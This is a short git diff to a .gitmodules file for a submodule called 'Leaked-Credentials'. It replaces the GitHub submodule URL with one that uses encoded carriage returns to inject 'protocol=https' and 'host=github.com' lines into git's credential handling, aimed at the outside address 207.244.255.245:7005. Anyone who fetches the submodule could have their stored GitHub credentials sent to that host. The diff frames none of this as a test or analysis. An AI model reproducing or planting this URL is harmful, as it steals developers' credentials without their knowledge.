@@ -1,12 +1,3 @@
 [submodule "Leaked-Credentials"]
 	path = Leaked-Credentials
-	url = https://github.com/h4x0r-dz/Leaked-Credentials.git
-        update = dir
-        branch = dir
-        fetchRecurseSubmodules = dir
-        active = dir
-        recurse = dir
-        propagateBranches = dir
-        fetchJobs = dir
-        alternateLocation = dir
-        alternateErrorStrategy = dir
+	url = http://%0dprotocol=https%0dhost=github.com%0d@207.244.255.245:7005/
